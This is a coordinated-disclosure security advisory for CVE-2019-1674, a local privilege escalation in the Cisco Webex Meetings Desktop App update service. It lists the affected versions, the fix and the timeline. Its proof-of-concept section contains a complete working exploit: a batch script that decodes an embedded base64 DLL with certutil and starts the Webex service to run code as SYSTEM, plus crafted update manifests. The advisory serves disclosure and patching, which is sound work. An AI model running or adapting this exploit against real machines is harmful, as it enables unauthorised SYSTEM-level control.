@@ -1,0 +1,456 @@
+SecureAuth - SecureAuth Labs Advisory
+http://www.secureauth.com/
+
+Cisco WebEx Meetings Elevation of Privilege Vulnerability Version 2
+
+1. *Advisory Information*
+
+Title: Cisco WebEx Meetings Elevation of Privilege Vulnerability Version 2
+Advisory ID: CORE-2018-0012
+Advisory URL:
+http://www.secureauth.com/labs/advisories/cisco-webex-meetings-elevation-privilege-vulnerability-version-2
+Date published: 2019-02-27
+Date of last update: 2019-02-27
+Vendors contacted: Cisco
+Release mode: Coordinated release
+
+2. *Vulnerability Information*
+
+Class: OS command injection [CWE-78]
+Impact: Code execution
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-2019-1674
+
+3. *Vulnerability Description*
+
+Cisco's Webex Meetings website states that [1]:
+
+Cisco Webex Meetings: Simply the Best Video Conferencing and Online
+Meetings.
+With Cisco Webex Meetings, joining is a breeze, audio and video are
+clear, and screen sharing is
+easier than ever. We help you forget about the technology, to focus on
+what matters.
+
+A vulnerability in the update service of Cisco Webex Meetings Desktop
+App for Windows could allow
+a local attacker to elevate privileges.
+
+4. *Vulnerable Packages*
+
+. Cisco Webex Meetings Desktop App v33.6.4.15
+. Cisco Webex Meetings Desktop App v33.6.5.2
+. Cisco Webex Meetings Desktop App v33.7.0.694
+. Cisco Webex Meetings Desktop App v33.7.1.15
+. Cisco Webex Meetings Desktop App v33.7.2.24
+. Cisco Webex Meetings Desktop App v33.7.3.7
+. Cisco Webex Meetings Desktop App v33.8.0.779
+. Cisco Webex Meetings Desktop App v33.8.1.13
+. Cisco Webex Meetings Desktop App v33.8.2.7
+. Older versions are probably affected too, but they were
+  not checked.
+
+5. *Vendor Information, Solutions and Workarounds*
+
+Cisco informed that released the vulnerability is fixed in Cisco Webex
+Meetings Desktop App releases 33.6.6 and 33.9.1.
+
+In addition, Cisco published the following advisory:
+https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190227-wmda-cmdinj
+
+6. *Credits*
+
+This vulnerability was discovered and researched by Marcos Accossatto
+from SecureAuth. The publication of this advisory was coordinated by
+Leandro Cuozzo from SecureAuth Advisories Team.
+       
+7. *Technical Description / Proof of Concept Code*
+
+7.1. *Privilege Escalation*
+
+[CVE-2019-1674]
+The update service of Cisco Webex Meetings Desktop App for Windows does
+not properly validate version numbers of new files. An unprivileged
+local attacker could exploit this vulnerability by invoking the update
+service command with a crafted argument and folder. This will allow the
+attacker to run arbitrary commands with SYSTEM user privileges.
+           
+The vulnerability can be exploited by copying to a local attacker
+controller folder, the atgpcdec.dll binary and rename it as atgpcdec.7z.
+Then, a previous version of the ptUpdate.exe file must be compressed as
+7z and copied to the controller folder. Also, a malicious dll must be
+placed in the same folder, named vcruntime140.dll and compressed as
+vcruntime140.7z. Finally, a ptUpdate.xml file must be provided in the
+controller folder for the update binary (ptUpdate.exe) to treat our
+files as a normal update. To gain privileges, the attacker must start
+the service with the command line:
+sc start webexservice WebexService 1 989898 "attacker-controlled-path"
+           
+Proof of Concept:
+
+The following proof of concept performs a 2 step attack, since starting
+from version 33.8.X, the application enforces the checking of signatures
+for all the downloaded binaries. This 2 step attack works against all
+the mentioned vulnerable packages. Notice that you'll need the previous
+versions of the ptUpdate.exe executable. Those versions are:
+3307.1.1811.1500 for the first step and 3306.4.1811.1600 for the last
+step. To exploit version priot to 33.8.X, only one step is required
+(the last step in this PoC).
+
+Batch file:
+/-----
+@echo off
+REM Contents of PoC.bat
+REM
+REM This batch file will exploit CVE-2019-1674
+REM
+REM First, it will copy the atgpcdec.dll file from the installation
+REM folder to the current folder as atgpcdec.7z. Then, it will backup
+REM ptUpdate.exe and vcruntime140.dll files from the installation folder
+REM in the current folder, adding .bak to their names. Keep in mind that
+REM those files will be replaced (especially, vcruntime140.dll) and if
+REM not restored, will render the application useless.
+REM
+REM The executable ptUpdate.exe version 3307.1.1811.1500 must be
+REM compressed as ptUpdate0.7z and present in the current folder.
+REM The executable ptUpdate.exe version 3306.4.1811.1600 must be
+REM compressed as ptUpdate1.7z and present in the current folder.
+REM Both can be generated using 7zip GUI and compressing as 7z, with
+REM normal compression level and LZMA compression method.
+REM Another way is to compress both files using the command line app:
+REM
+REM 7z.exe a ptUpdate0.7z ptUpdate.exe -m0=BCJ -m1=LZMA:d=21
+REM
+REM ptUpdate0.xml file will be used in the first stage of the attack. It
+REM will be renamed to ptUpdate.xml. Make sure to check and adjust (if
+REM necessary) the "Size" and "PackagedSize" values of the xml, to the
+REM ptUpdate0.7z ones. ptUpdate0.7z will be renamed to ptUpdate.7z. Then
+REM the update service will be started.
+REM
+REM The batch will wait until the process (ptUpdate.exe) finishes
+REM
+REM After the first stage is completeted, it will rename ptUpdate.7z
+REM back to ptUpdate0.7z, and ptUpdate.xml to ptUpdate0.xml.
+REM
+REM Now, ptUpdate1.xml file will be used in the second stage of the
+REM attack. It will be renamed to ptUpdate.xml. Also, ptUpdate1.7z will
+REM be renamed to ptUpdate.7z. Remember to check and adjust (if
+REM necessary) the "Size" and "PackagedSize" values of the xml, to the
+REM ptUpdate1.7z ones. Out "malicious" DLL will be generated using
+REM certutil.exe and named vcruntime140.7z. It's a simple dll that will
+REM execute notepad.exe on load and that has the same exported functions
+REM as the original. The update service will be started again.
+REM
+REM The batch will wait until the process (ptUpdate.exe) finishes
+REM
+REM Once finished, it will print that the attack is done and wait for a
+REM key press. You should see a notepad.exe (2, in fact) with SYSTEM
+REM user privileges running.
+REM
+REM After a key is pressed, the batch will finish removing atgpcdec.7z
+REM and vcruntime140.7z. Also it will rename ptUpdate.7z back to
+REM ptUpdate1.7z, and ptUpdate.xml to ptUpdate1.xml.
+
+
+:CheckOS
+IF EXIST "%PROGRAMFILES(X86)%" (GOTO 64BIT) ELSE (GOTO 32BIT)
+
+:64BIT
+copy "%PROGRAMFILES(X86)%\Webex\Webex\Applications\atgpcdec.dll" atgpcdec.7z
+copy "%PROGRAMFILES(X86)%\Webex\Webex\Applications\ptUpdate.exe"
+ptUpdate.exe.bak
+copy "%PROGRAMFILES(X86)%\Webex\Webex\Applications\vcruntime140.dll"
+vcruntime140.dll.bak
+GOTO END
+
+:32BIT
+copy "%PROGRAMFILES%\Webex\Webex\Applications\atgpcdec.dll" atgpcdec.7z
+copy "%PROGRAMFILES%\Webex\Webex\Applications\ptUpdate.exe" ptUpdate.exe.bak
+copy "%PROGRAMFILES%\Webex\Webex\Applications\vcruntime140.dll"
+vcruntime140.dll.bak
+GOTO END
+
+:END
+
+ren ptUpdate0.xml ptUpdate.xml
+ren ptUpdate0.7z ptUpdate.7z
+SET mypath=%~dp0
+sc start webexservice WebexService 1 989898 %mypath:~0,-1%
+
+ECHO Waiting 3 seconds until ptUpdate.exe starts
+Timeout /T 3 /Nobreak
+
+:LOOP1
+tasklist | find /i "ptUpdate" >nul 2>&1
+IF ERRORLEVEL 1 (
+  GOTO CONTINUE1
+) ELSE (
+  ECHO ptUpdate.exe is still running
+  Timeout /T 1 /Nobreak
+  GOTO LOOP1
+)
+
+:CONTINUE1
+
+ren ptUpdate.xml ptUpdate0.xml
+ren ptUpdate.7z ptUpdate0.7z
+ren ptUpdate1.xml ptUpdate.xml
+ren ptUpdate1.7z ptUpdate.7z
+
+echo
+N3q8ryccAARIz/fVRwYAAAAAAAB6AAAAAAAAANcfWYEAJpaOcAAX9+wFu+r0/5QBL0TuTr0Jkm3dgTnz3Weoe6NfFfEa/Y28zsBB2HEdPWzlugty+IIM4hglhy/h80OeyYw5CMe7jUK77wLPQMC9wwpT+oLYVDSuOK/v2WNuOLCpU3qtGSO+2sIFpGixpKQvLykpGOZUMczuRNNr/8Ps1lApsqe0ERm7gPGyiMqJBOCOVTC85lKIa2Cmc
+> dll.txt
+echo
+scrjgqKPPNmbXvscJWxmvv4NtC3mLQ1KuXYBSZXmFp8dR+ZDy5znkGG/C3w0T76c4wRCfOk+/myji9luDzO2OOwp8wgpN1QeGsA4+kaZwKYTisIvPegsI2joDsLAomIh2ToXENtcOA9/11kkJy4ColEdqlXxwSW2u45ajuNDs0aAE9nbz4AWXtv/VPfc4fn3Q+mN7FTmaDUr8dxZ5V05IafOO2qTgdSHPemTasMSqYLbzA8iaxBZimokw
+>> dll.txt
+echo
+zyzr3fwZIci+Ewzq5BnNXk+lvA30xCUYdvQuMCGkxBozk9Ec0kQ/SUixz77Nc9SbJnm0Hncff3QRRlU9ciqc6cYkQ2Cm+/dWkyDgJU+sxT9VGV+WVwNK85Q6zpPWLeVRYtk9UkxKHF0aXf3l/OgfQqtz0WSR94AF+Z9AiblDy0zOreSW8PhFbu0hfAgY1pMNC5gPNJiJ3OGwT/cLEhBPusvpfcLP3V0BwXx04T+5R7d5Rw9xWExdfCzGb
+>> dll.txt
+echo
+Mgyijdf5nP7fv9e5V0KO8kKrGVofstVIN8FTQSMeRGYRdv9WyuLRFWbArCL86HMo5NYEwFinlqCGqnY8hZcDMPe89q1xoNlVDmDtLC+AZqEkPKuqStllzKH7qQDg7Ahe6AMtGjaT2NptL2bSBYlkfn+1iiMt5cC/inZAoZoreSpDbGb4HRcOVce7ZKeiBAFpEzM0bEXAxnbLNO0pHm0bYCftbOkffJap3m79V+Dj4t0NPgwbhYKUqk1Hi
+>> dll.txt
+echo
+/9ebVE+IIsUlFFggilCy7BmIh3MF3Gmuhr7QLK37zV72LA0/tuDXXTWP/0EJEQ3F/v1+hSj/+HMwUBFL8xsghBfOXTpmBG6cUxK2YOwXvs/ntja2a7SWwppxtWgr4n/pxEdeezoBGl1sTZ9aIwSlu1mMehS5RYoyiSKnQfgLMsIYLqjZtc2DjUdSZDutZgC91axMjIEQ8kDIBp8dbuX4MpzNYe65OrKG/u76aemvcQ/R1QAwgTopuWgqO
+>> dll.txt
+echo
+tJ7LIkRv406u+Qs2d5KA9+IplFV7ZL9w1zXTDTFqATROK0IKtY2MPaP5Ia0d0UFizj0I7OZSeDtZXPohMxi01xMLyqCXIQ4vaJGVneNi1SyxAJ2hV92+5sxBCOlQ+d4w19k6iJA/siz1+V0FnIrN6csCMaW6yBnR6H+jHpm2sqXf3xyU8UkCRx09LmD1lcSB3sWdc3AnoG2ijb7lD6eBdCH2OlMWceeAfOMRm48MfYW6+AcZJm9wEQ9p8
+>> dll.txt
+echo
+irxwCQuETvGMphqzbPxFJXErhoMTxlE57+/ZLBt8F/3XAaxQnmMucvSCFMYc6Z76OCbeotPfVnPhqL+torsEaph6DFzcw3dWuFrekbLnVVFKmM/QyeZVLS18u5lY1tGRyfAUCyhPIPJvUcXFKuDYHmdT/bOnF1B/xexvtY8boRhcKiNg4JBluTMbamdoktvfWvIVGUz2m50yA0dNN06yebHietxA+IwM0zfNbqpNWJjOItsi6/27j1mE7
+>> dll.txt
+echo
+WCgPS5tetN44WkYD28Bm+LmHwz4lbPVjAIcgZBv0OtAXJsWMUtN8Bc2z9+fVSqc7pCHGCRnYDyKm8QhcV8hU4I/M4hSN+BWYn2jGJqc42lcaMzfXrySCnF4dAtIiE1HzAwmwWAqjlVkZdFiIuQ1m+pdbx2Ipji5piYRAJtykwO0H5JThzAzJGObOMCAenaKgvgtwF97iFdBZHxuSz+3DcYF6gQupm/BxNd35l6qj19sN2qixeGJ7rQapV
+>> dll.txt
+echo
+DJLTM5KMPdSItBNJSLLp9fuObcufi/6MBif28vemivzaWtalocJxX/MJni8PfdLYn/rLJQXmpq4Qm7z6N7FlPLtelATkMAZZ2ofaLFeBvIKzymBqtsxQAb63b+MowQvOkGAesT5JNXhoRqzOoATB9I/O7xIZu30SZwWdW85DX2MNAeB/DgzLt/c7U9A2D5vIgAEEBgABCYZHAAcLAQACIwMBAQVdABgAAAQDAwEDAQAMmACYAAAICgGcR
+>> dll.txt
+echo
+dWGAAAFARkLAAAAAAAAAAAAAAARIwB2AGMAcgB1AG4AdABpAG0AZQAxADQAMAAuAGQAbABsAAAAGQAUCgEAkBJyInaL1AEVBgEAIAAAAAAA
+>> dll.txt
+certutil -decode dll.txt vcruntime140.7z
+
+del dll.txt
+
+SET mypath=%~dp0
+sc start webexservice WebexService 1 989898 %mypath:~0,-1%
+
+ECHO Waiting 3 seconds until ptUpdate.exe starts
+Timeout /T 3 /Nobreak
+
+:LOOP2
+tasklist | find /i "ptUpdate" >nul 2>&1
+IF ERRORLEVEL 1 (
+  GOTO CONTINUE2
+) ELSE (
+  ECHO ptUpdate.exe is still running
+  Timeout /T 1 /Nobreak
+  GOTO LOOP2
+)
+
+:CONTINUE2
+
+ECHO Attack done!
+pause
+
+ren ptUpdate.xml ptUpdate1.xml
+ren ptUpdate.7z ptUpdate1.7z
+del atgpcdec.7z
+del vcruntime140.7z
+-----/
+
+ptUpdate0.xml file:
+           
+/-----
+<?xml version="1.0"?>
+<serv:message xmlns:serv="http://www.webex.com/schemas/2002/06/service"
+xmlns:com="http://www.webex.com/schemas/2002/06/common"
+xmlns:use="http://www.webex.com/schemas/2002/06/service/user">
+    <serv:header></serv:header>
+    <serv:body>
+        <serv:bodyContent xsi:type="use:getUpdateResponse"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+            <UpdateVersionNumber>33.8.3</UpdateVersionNumber>
+            <BuildNumber>33.8.3-24</BuildNumber>
+            <ExternalVersionNumber>33.8.3.24</ExternalVersionNumber>
+            <GPCINI>self/gpc.php</GPCINI>
+            <ReleaseDate>February 2017</ReleaseDate>
+            <Description>WebEx Productivity Tools 33.8.3</Description>
+            <MsiLocation>msi/ptools.msi</MsiLocation>
+            <UpdateFormat>binary</UpdateFormat>
+            <ReleaseTrain>T32</ReleaseTrain>
+            <Location>$dummy/upgradeserver/client/ptool/33.8.3</Location>
+            <ControlOption>0</ControlOption>
+            <WBSVERSION>33</WBSVERSION>
+            <Server>myCompany.webex.com</Server>
+            <UserName>MCKSysAR@myCompany.com</UserName>
+            <DownloadSize>22496333</DownloadSize>
+            <VersionURL/>
+            <FileInfo>
+                <SectionName>Installation</SectionName>
+                <PackedName>ptupdate.7z</PackedName>
+                <PackedNameL10N>ptupdate.7z</PackedNameL10N>
+                <OrigianlName>ptupdate.exe</OrigianlName>
+                <Version>3307,1,1811,1500</Version>
+                <Size>1985592</Size>
+                <PackagedSize>610752</PackagedSize>
+                <CheckMethod>1</CheckMethod>
+                <CouldIgnore>1</CouldIgnore>
+                <NeedDownLoad>1</NeedDownLoad>
+            </FileInfo>
+            <Tools>
+                <UseEmailType/>
+                <Outlook>0</Outlook>
+                <Notes>0</Notes>
+                <UseWebExWithOffice>1</UseWebExWithOffice>
+                <Excel>0</Excel>
+                <PowerPoint>0</PowerPoint>
+                <Word>0</Word>
+                <IEShortCut>1</IEShortCut>
+                <IERightMenu>0</IERightMenu>
+                <UseWebExWithIM>1</UseWebExWithIM>
+                <AOL>0</AOL>
+                <Sametime>0</Sametime>
+                <WindowsMessenger>0</WindowsMessenger>
+                <Yahoo>0</Yahoo>
+                <Skype>0</Skype>
+                <GoogleTalk>0</GoogleTalk>
+                <Firefox/>
+                <IPPhone>1</IPPhone>
+            </Tools>
+        </serv:bodyContent>
+    </serv:body>
+</serv:message>
+-----/
+
+ptUpdate1.xml file:
+
+/-----
+<?xml version="1.0"?>
+<serv:message xmlns:serv="http://www.webex.com/schemas/2002/06/service"
+xmlns:com="http://www.webex.com/schemas/2002/06/common"
+xmlns:use="http://www.webex.com/schemas/2002/06/service/user">
+    <serv:header>                                                       
+    </serv:header>
+    <serv:body>
+        <serv:bodyContent xsi:type="use:getUpdateResponse"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+            <UpdateVersionNumber>33.8.4</UpdateVersionNumber>
+            <BuildNumber>33.8.4-24</BuildNumber>
+            <ExternalVersionNumber>33.8.4.24</ExternalVersionNumber>
+            <GPCINI>self/gpc.php</GPCINI>
+            <ReleaseDate>February 2017</ReleaseDate>
+            <Description>WebEx Productivity Tools 33.8.4</Description>
+            <MsiLocation>msi/ptools.msi</MsiLocation>
+            <UpdateFormat>binary</UpdateFormat>
+            <ReleaseTrain>T32</ReleaseTrain>
+            <Location>$dummy/upgradeserver/client/ptool/33.8.4</Location>
+            <ControlOption>0</ControlOption>
+            <WBSVERSION>33</WBSVERSION>
+            <Server>myCompany.webex.com</Server>
+            <UserName>MCKSysAR@myCompany.com</UserName>
+            <DownloadSize>22496333</DownloadSize>
+            <VersionURL/>
+            <FileInfo>
+                <SectionName>Common</SectionName>
+                <PackedName>vcruntime140.7z</PackedName>
+                <PackedNameL10N>vcruntime140.7z</PackedNameL10N>
+                <OrigianlName>vcruntime140.dll</OrigianlName>
+                <Version>14,14,26405,0</Version>
+                <Size>6144</Size>
+                <PackagedSize>1761</PackagedSize>
+                <CheckMethod>1</CheckMethod>
+                <CouldIgnore>1</CouldIgnore>
+                <NeedDownLoad>1</NeedDownLoad>
+            </FileInfo>
+            <FileInfo>
+                <SectionName>Installation</SectionName>
+                <PackedName>ptupdate.7z</PackedName>
+                <PackedNameL10N>ptupdate.7z</PackedNameL10N>
+                <OrigianlName>ptupdate.exe</OrigianlName>
+                <Version>3306,4,1811,1600</Version>
+                <Size>1992760</Size>
+                <PackagedSize>611786</PackagedSize>
+                <CheckMethod>1</CheckMethod>
+                <CouldIgnore>1</CouldIgnore>
+                <NeedDownLoad>1</NeedDownLoad>
+            </FileInfo>
+            <Tools>
+                <UseEmailType/>
+                <Outlook>0</Outlook>
+                <Notes>0</Notes>
+                <UseWebExWithOffice>1</UseWebExWithOffice>
+                <Excel>0</Excel>
+                <PowerPoint>0</PowerPoint>
+                <Word>0</Word>
+                <IEShortCut>1</IEShortCut>
+                <IERightMenu>0</IERightMenu>
+                <UseWebExWithIM>1</UseWebExWithIM>
+                <AOL>0</AOL>
+                <Sametime>0</Sametime>
+                <WindowsMessenger>0</WindowsMessenger>
+                <Yahoo>0</Yahoo>
+                <Skype>0</Skype>
+                <GoogleTalk>0</GoogleTalk>
+                <Firefox/>
+                <IPPhone>1</IPPhone>
+            </Tools>
+        </serv:bodyContent>
+    </serv:body>
+</serv:message>
+-----/
+
+8. *Report Timeline*
+2018-12-04: SecureAuth sent an initial notification to the Cisco PSIRT
+including a draft advisory.
+2018-12-05: Cisco confirmed the reception of the advisory and informed
+they will open a case.
+2018-12-07: Cisco replied that they were able to reproduce the
+vulnerability and they were working on a plan for the fix.
+2018-12-07: SecureAuth thanked the update.
+2018-12-10: Cisco notified SecureAuth that the general availability of
+the fix will be before end of February.
+2018-12-10: SecureAuth thanked the update.
+2019-01-15: SecureAuth asked Cisco for an update.
+2019-01-22: SecureAuth asked Cisco for an update again.
+2019-01-22: Cisco answered saying they were still targeting the end of
+February for the release of the fix.
+2019-02-11: Cisco confirmed 27th February as the disclosure date.
+2019-02-27: Advisory CORE-2018-0012 published.
+
+9. *References*
+
+[1] https://www.webex.com/products/video-conferencing.html
+
+10. *About SecureAuth Labs*
+
+SecureAuth Labs, the research arm of SecureAuth Corporation, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct research in several important areas of
+computer security, including identity-related attacks, system
+vulnerabilities and cyber-attack planning. Research includes problem
+formalization, identification of vulnerabilities, novel solutions and
+prototypes for new technologies. We regularly publish security
+advisories, primary research, technical publications, research blogs,
+project information, and shared software tools for public use at
+http://www.secureauth.com.
+
+11. *About SecureAuth*
+
+SecureAuth is leveraged by leading companies, their employees, their
+customers and their partners to eliminate identity-related breaches. As
+a leader in access management, SecureAuth is powering an identity
+security revolution by enabling people and devices to intelligently
+and adaptively access systems and data, while effectively keeping bad
+actors from doing harm. By ensuring the continuous assessment of risk
+and enablement of trust, SecureAuth's highly flexible platform makes it
+easier for organizations to prevent the misuse of credentials. To learn
+more, visit www.secureauth.com, call (949) 777-6959, or email us at
+info@secureauth.com
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2019 SecureAuth, and are
+licensed under a Creative Commons Attribution Non-Commercial Share-Alike
+3.0 (United States) License:
+http://creativecommons.org/licenses/by-nc-sa/3.0/us/
